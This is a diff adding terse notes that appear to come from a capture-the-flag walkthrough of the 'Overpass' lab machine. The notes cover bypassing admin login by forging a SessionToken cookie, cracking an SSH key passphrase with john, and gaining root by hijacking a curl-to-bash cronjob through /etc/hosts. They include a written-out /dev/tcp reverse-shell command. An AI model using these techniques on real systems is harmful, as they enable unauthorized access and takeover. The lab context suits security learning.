@@ -1,0 +1,38 @@
+ports-
+	80-
+      ------
+	/admin	-->
+		/login.js	-->	found this js file, sets cookie 'SessionToken' to value - 'statusOrCookie' if creds are correct.
+					'''
+					SessionToken : statusOrCookie
+					'''
+					so we manually inserted the cookie and logged in as admin
+					found key to ssh.
+	ssh key-
+      ------------
+	key is protected with passphrase
+	used john to brute-force the key	-->	james13
+
+found user flag
+
+**********************************************************************************
+
+
+Priv Esc-
+
+what's happening -
+---------------------
+
+1. linpeas.sh	-->	found cronjob	-->	* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+2. downloaded this buildscript.sh on local machine
+3. the target machine is triggering the localhost to download the buildscript.sh content and write it to bash
+
+
+what we have to do -
+----------------------
+1. write our attackr machine's ip to	-->	/etc/hosts
+2. since the buildscript.sh file is in '/downloads/src/' path, we will make the same path and will host our own malicious buildscript.sh there with a reverse shell in it
+3. write - 'bash -i >& /dev/tcp/10.8.118.82/4242 0>&1' to the buildscript.sh and listen for incomming connection on attacker's machine
+4. start the python server and wait for incomming connection
+
+found root flag
